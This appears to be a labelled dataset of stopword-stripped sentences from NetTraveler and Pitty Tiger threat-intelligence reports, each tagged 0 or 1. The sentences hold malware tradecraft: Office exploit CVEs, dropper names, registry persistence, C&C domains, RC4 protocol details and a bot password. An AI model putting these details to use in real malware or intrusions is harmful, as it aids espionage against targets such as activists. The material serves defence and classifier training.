We written NetTraveler HERE HERE	0
Earlier year observed uptick number attacks Uyghur Tibetan supporters using updated version NetTraveler backdoor	0
Here 's example targeted spear-phishing e-mail directed Uyghur activists March 2014	1
The e-mail two attachments non-malicious JPG file 373 KB Microsoft Word .DOC file	1
The .DOC	0
file reality '' Single File Web Page '' container also known '' Web archive file '' appears created system using Microsoft Office - Simplified Chinese	0
It contains exploit CVE-2012-0158 vulnerability detected Kaspersky Lab products Exploit.MSWord.CVE-2012-0158.db	0
If run vulnerable version Microsoft Office drops main module '' net.exe '' ( detected Kaspersky Lab products Trojan-Dropper.Win32.Agent.lifr ) turn installs number files	1
The main C & C module dumped '' % SystemRoot % \system32\Windowsupdataney.dll '' ( detected Kaspersky Trojan- Spy.Win32.TravNet.qfr )	1
It registered service ( named '' Windowsupdata '' ) Windows Batch file named '' DOT.BAT '' ( detected Kaspersky Lab products Trojan.BAT.Tiny.b ) To make sure malware n't running multiple times uses mutex '' SD2013 Is Running '' mark presence system	1
Other known mutexes used older current variants include The malware configuration file written '' SYSTEM '' folder ( opposed SYSTEM32 ) slightly new format compared '' older '' NetTraveler samples For record 's older NetTraveler config file looks like Obviously developers behind NetTraveler taken steps try hide malware 's configuration	1
Luckily encryption relatively simple break	0
The algorithm follows Once decrypted new config looks like One easily see command-and-control ( C & C ) server screenshot '' uyghurinfo [ ] com ''	1
We identified several samples using new encryption scheme	0
A list extracted C & C servers found We recommend blocking hosts firewall	0
This year actors behind NetTraveler celebrate 10 years activity	0
Although earliest samples seen appear compiled 2005 certain indicators point 2004 year activity started	0
For 10 years NetTraveler targeting various sectors focus diplomatic government military targets	0
Most recently main focus interest cyber-espionage activities revolved around space exploration nano-technology energy production nuclear power lasers medicine communications	0
The targeting Uyghur Tibetan activists remains standard component activities assume stay way perhaps another 10 years	0
Cyber espionage hot topic last years	0
Computer attacks known '' APT '' ( Advanced Persistent Threat ) become widely reported emphasized media damages considered real strategic trends moving cyber defense	0
AIRBUS Defence & Space – CyberSecurity unit responds attacks customers every day developing complete range solutions	0
Today decided release publicly information specific group APT attackers known '' Pitty Tiger ''	0
This information comes directly investigations led Threat Intelligence	0
Pitty Tiger group attackers active since least 2011	0
They targeted private companies several sectors defense telecommunications also least one government	0
We able track group attackers provide detailed information	0
We able collect reveal '' malware arsenal ''	0
We also analyzed technical organization	0
Our investigations indicate Pitty Tiger used 0day vulnerability far rather prefer using custom malware developed group 's exclusive usage	0
Our discoveries indicate Pitty Tiger group attackers ability stay radar yet still mature groups attackers monitor	0
Pitty Tiger probably state-sponsored group attackers	0
They lack experience financial support one would expect state-sponsored attackers	0
We suppose group opportunistic sells services probable competitors targets private sector	0
We able leverage several attackers profiles showing Pitty Tiger group fairly small compared APT groups probably saw work limited amount targets	0
At end report provide indicators compromise help people detect current Pitty Tiger attacks	0
APT attacks follow call '' APT kill chain ''	0
The kill chain describes briefly way attackers perform actions	0
It summarized following scheme The reconnaissance phase commences attacker selects new target involves acquisition information target	0
There little information available phase little data	0
The way collect information phase would already monitor attackers ' actions step hardly feasible	0
The longer attackers spend time attempting understand target online presence easier find efficient ways penetrate company 's systems	0
This reconnaissance phase finding information break targeted network successfully searching data could help accelerate sensitive information isolation ( like name key employee example )	0
This phase mostly relies open sources Internet social networks press releases white papers corporate websites search engines also active tools like vulnerability scanners etc	0
At stage APT attackers solid knowledge target key employees	0
The attackers everything need start looking entry point company 's network establish one several permanent backdoors environment	1
The attackers mostly rely two techniques infect one several computers usually workstations inside target 's network spear phishing drive-by downloads	1
Spear phishing described targeted e-mail phishing	1
In spear phishing scheme attackers send e-mails targeted people	1
In fact even send single e-mail	0
The trick target right victim provide right content click link leading drive-by download malware open attached file infect computer	1
Some groups attackers also use '' watering hole '' techniques successfully compromise targets	1
To build watering hole attack attackers compromise website third party generally supplier target typically visited specific group professionals likely target	1
Every visitor compromised third party infected	1
The method one major drawback also infect third parties visit website	0
Attackers developed ways avoid	0
If reconnaissance phase done effectively already know IP ranges used target company	0
It takes lines code infecting script compromise visitors coming target IP ranges	1
Direct attacks servers target also way penetrate target 's network	0
Attackers gained access one several machines inside target 's corporate network	1
They need install several different backdoors order able always access network	1
In case one backdoor falls others	0
As soon attackers sure enough access start looking two things intellectual property ( anything else want know steal ) alignment predefined mission objectives means privilege escalation facilitate lateral movement within compromised environment	1
It generally take long attackers gain domain administrator privileges dump Active Directory content	1
They use lateral moves machines inside network look everything need	0
This step hard detect since use valid credentials legitimate administration tools PsExec	0
Data exfiltration last step attackers loop lateral moves step never-ending circle prolonged access information theft	1
They generally create archive files containing content want exfiltrate sent attackers using remote administration tool ( RAT ) transfer protocols FTP HTTP	1
This phase end APT attack	0
The attackers loop access strengthening/lateral moves stage generally keep stealing information stay inside network data gathering	1
For information APT phases please refer APT Kill Chain blog post serie	0
During regular investigations APT cases one particular variant malware caught attention faced	0
We decided spend time investigate around malware found used exclusively single group attackers	0
This malware family known '' PittyTiger '' anti-virus research community	0
We discovered malware sample June 2014 leading command & control ( c & c ) server still activity	1
Our researches around particular malware family revealed '' Pitty Tiger '' group active since 2011 yet found publications could probably attributed group attacker back 2010	0
This group uses malware tools APT operations addition PittyTiger RAT	0
A variant infamous Gh0st RAT dubbed '' Paladin '' used repeatedly PT group together RATs seem developed exclusively PT group '' MM RAT '' ( aka Troj/Goldsun-B ) '' CT RAT ''	0
Another variant Gh0st RAT named '' Leo '' found inactive c & c server	0
We also found another malware named '' Troj/ReRol.A ''	0
This one also used group infect workstations collect system information install malware infected computer	1
It acts first stage downloader system data collector often used initial compromise Pitty Tiger campaigns generally embedded Microsoft Office documents	1
Thanks server 's misconfigurations managed get information three c & c servers used group attackers provided us insight end 2013 beginning July 2014	1
Our investigation focused data could get c & c servers also Pitty Tiger environment	0
This whitepaper aims expose view group especially infrastructure capabilities	0
We hope publication bring counter analysis research community enrich global common threat knowledge	0
Pitty Tiger like APT groups use spear phishing e-mails extensively order gain initial foothold within targeted environment	1
We able find spear phishing e-mail crafted attackers	1
This e-mail spoofed identity employee targeted company The attached file Microsoft Office Word document triggering CVE-2014-1761 infect computer sent While example looks '' amateur '' spear phishing attempt suppose group conducted advanced spear phishing campaigns based fact found infected Word documents showing content stolen victims group	1
These documents infecting system Troj/ReRol.A malware detail later report	1
This could mean Pitty Tiger group using stolen material spear phishing content either target persons compromised company target persons competitor's company generally compromise another target	1
Pitty Tiger also seem use fake Microsoft Office Excel content yet could find empty content delivering Troj/ReRol.A malware	1
Although able find evidences attack aimed exploiting vulnerabilities group 's targets servers able record several vulnerability scanning launched one c & c server straight targets	1
The attackers using different vulnerability scanners aimed targets	1
While targets scanned '' generic '' vulnerability scanning tools like HScan Fluxay port scanners like Nmap targets scanned specific vulnerabilities like ZyWALL vulnerability FORTINET product	1
We also able testify Pitty Tiger group successfully collected information targets exploiting HeartBleed bug	1
This vulnerability exists old versions OpenSSL allows attackers collect data chunks memory targeted machine	1
It allowed Pitty Tiger group get admin credentials least one target example	1
Running automated vulnerability scanners whole ranges IP addresses used targets several domains noisy way collect information find server vulnerabilities	1
We would advocate method unwise want stay furtive c & c server surprising say least	0
While Pitty Tiger group experienced aspects running APT campaigns definitely lacks maturity	0
One favorite methods used Pitty Tiger group infect users use Microsoft Office Word document exploits specific vulnerability	1
The payload infecting system malware known '' Troj/ReRol.A ''	1
It generally first step initial compromise Pitty Tiger campaigns	0
We able find one document used group attacker exploiting CVE- 2012-0158 old critical vulnerability impacting Microsoft Office corrected Microsoft's MS12-027 fix April 2012	1
This vulnerability affects Microsoft Office versions Office 2010	0
We also found one RTF document embedding CVE-2014-1761 recent exploit	1
We discovered several different documents spreading malware triggering CVE-2012-0158 vulnerability yet could share report since documents contain information victims Pitty Tiger group	1
The discovery '' old '' vulnerability exploitation June 2014 could mean Pitty Tiger group direct access 0day exploits enough budgets buy	0
It could also mean use low range exploit default working targets sufficient compromise workstations	0
The Word document initially found probably '' test '' document used group	0
When opened shows single line written Chinese language translated '' Hello '' When successfully triggered exploit infects host dropping executing file named '' svohost.exe '' temporary folder currently logged-in user This binary '' Troj/ReRol.A '' according Sophos naming convention	1
It immediately triggers alarms sandbox The binary drops copy Application Data folder currently logged-in user The malware initiates communication time.windows.com check connectivity communicates c & c server mac.avstore.com.tw	1
Very variants Troj/ReRol.A public	0
The variants seen use User- Agent The persistence mechanism used malware creation registry key named '' Shell '' containing path malware infected system The payload malware used collect information newly infected host send back c & c server	1
It also download execute binaries	1
The data sent POST request 0x11 bytes header consisting fixed-value byte ( 0xc3 ) followed 0x10 bytes encryption key	1
The data following header encrypted using RC4 previous key	1
Once data deciphered last byte clear text also 0xc3	0
We able decrypt communications confirmed transmitted c & c server	0
Here anonymized sample communication showing information collected malware This information useful attacker shows software installed system running services	1
Once data transferred c & c server responds sending additional malware execute machine	1
The c & c part consists two files The dr.asp registers following keywords These two binaries longer available server	0
However found various files could used '' 32.exe '' past The 322.exe file legitimate Chinese calc.exe tool	0
It might used attackers perform tests	0
The 3 others binaries RATs detailed next parts	0
This RAT origin attackers ' group name	0
'' PittyTiger '' mutex used malware	0
'' Pitty Tiger '' also string transmitted network communications RAT see chapter	0
The malware running sandbox triggers following alarms The binary drops two files '' C \Windows\System32 '' The '' qmgrxp.exe '' binary simple copy original binary	1
It drops '' packet64.dll '' injects '' explorer.exe ''	1
When executed mutex called '' PittyTiger '' created	1
Persistence achieved adding path binary WinlogonUserInit key The '' packet64.dll '' main payload RAT	1
After injected starts sending Hello packet c & c server All requests sent c & c contains string '' /FC001/ '' followed bot id	1
This id consists infected computer name followed dash lower word disk serial id	0
The data sent simply encoded using base64 cipher	1
The hello packet decoded looks like following Our sample 3 c & c servers configured The following commands implemented Regarding controller part found two different versions The interface handling Pitty TIGER CT connections interesting	1
We able confirm author two families malware person seen next chapter '' CT RAT ''	0
This remote administration tool often used Pitty Tiger group	1
We able acquire client server parts	0
We found two instances binary different names – 32mm.exe mm32.exe	0
This RAT seems evolution PittyTiger since specific server binary found could handle requests CT PittyTiger indicated compatible PittyTiger	0
Moreover commands implemented RATs	1
Unsurprisingly running sandbox RAT triggers alarms PittyTiger The binary drops two files '' C \Program Files\Internet Explorer '' The '' ieupdate.exe '' simple binary inject DLL '' explorer.exe ''	1
Persistence achieved via following registry key After injection RAT sends first login packet c & c The RAT communication performed HTTP requests	1
The data sent encrypted RC4 base64-encoded	1
The RC4 key Unicode form requested URL	0
The Login packet contains following string decoding deciphering It contains computer name user name internal IP address OS version RAT internal version Language ID system	1
The RAT receive commands c & c	1
Usual RAT features implemented Regarding configuration sample communicates '' sop.avstore.com.tw '' contains string '' Nov 13 2013 '' version identifier	1
The c & c part Windows binary written .NET	0
	0
We found 2 versions The About form gives name developer ( ) The version controller handle PittyTiger CT shows author ( ) As screenshots show switch PittyTiger CT probably last semester 2013	0
The text translated thanks Google Translate Further discussion author provided subsequent sections	0
We named malware '' MM RAT '' beginning investigation found existing name '' Troj/Goldsun-B '' according Sophos	0
This another remote administration tool often used Pitty Tiger crew	1
We able acquire client server part	0
The binary found named 3200.exe triggers following alarms sandbox The '' release.tmp '' file dropped system The binary also copied user 's '' Application Data '' directory injects '' release.tmp '' file '' explorer.exe ''	1
Persistence achieved adding path binary Winlogon Shell key The RAT embeds DNS server IP addresses make c & c domain names resolutions	1
These addresses listed It starts resolving domains injection immediately sends requests	1
First requests used check updates ( GET request /httpdocs/update/update.ini )	1
A Hello packet sent The bot repeatedly sends GET requests '' /httpdocs/mm/ botid /ComMand.sec '' retrieve remote commands	1
The communication protocol quite simple GET requests used receive data c & c POST requests send data	1
In POST commands CGI name represents command	1
The following features implemented The following CGI files requested bot The configuration stored locally file called '' schmup.sys ''	1
The file ciphered using RC4 using MD5 hash '' rEdstArs '' key	1
Our sample uses '' mca.avstore.com.tw '' '' star.yamn.net '' '' bz.kimoo.com.tw '' c & c servers	1
It contains '' 1.6.0 '' version number uses password '' 9ol.8ik '' authenticate bots	0
Unlike others c & c binaries c & c part RAT graphical interface remotely requested manage bots	1
Furthermore authentication required send commands c & c ( need know configured password interact bots )	1
The management protocol bots protocol different CGI files The bots ' answers remote commands retrieved requesting '' Reply.sec '' file ( e.g	0
GET /httpdocs/mm/ botid /Reply.sec ) These network patterns might ring bells researcher 's minds	0
The network communication used binary used Enfal malware used past Lurid group ( APT attackers ) threat actors China	0
An examination code reveal code similarities Enfal malware	0
We currently know malware uses patterns communicate	1
This another remote administration tool used Pitty Tiger group	1
We able get client server part	0
The binary found dropped malicious Word document	1
The following alarms triggered sandbox The shellcode contained Word file drops following file executes This one drops turn following file This tmp file copied '' C \Windows\system32\Nwsapagentex.dll '' registered service called '' Nwsapagent ''	1
This malware variant infamous Gh0st RAT	0
Our specific sample uses '' ssss0 '' instead usual '' Gh0st '' header network communications	0
The commands ID used communication protocol also changed features quite	0
The configuration directly embedded binary deciphered runtime	0
Up 5 c & c servers configured sample one '' ey.avstore.com.tw:53 ''	1
'' EY '' could stand '' Ernst & Young ''	0
It would surprising since lot different attack groups use anti-virus vendors big company 's names try look legitimate	0
Pitty Tiger exception detailed later report	0
We also found two c & c binaries claiming versions 2.1 2.2 Paladin RAT controller	0
Version 2.1 answers '' ssss0 '' header version 2.2 uses classical '' Gh0st '' header	0
Additionally Paladin RAT found another variant Gh0st RAT named '' Leo ''	0
Although found c & c server group evidence used group opposition Paladin used often Pitty Tiger	0
Moreover built malware found folder configured connect local IP address probably testing purposes	1
Our investigation focused three particular c & c servers used group	0
These c & c servers unlike c & cs used group misconfigured	0
Once parsed dumped provided us insight	0
We found several domains used Pitty Tiger group interesting ones detailed chapter	0
Pitty Tiger like APT attackers often use anti-virus '' familiar names '' registering domains creating subdomains	0
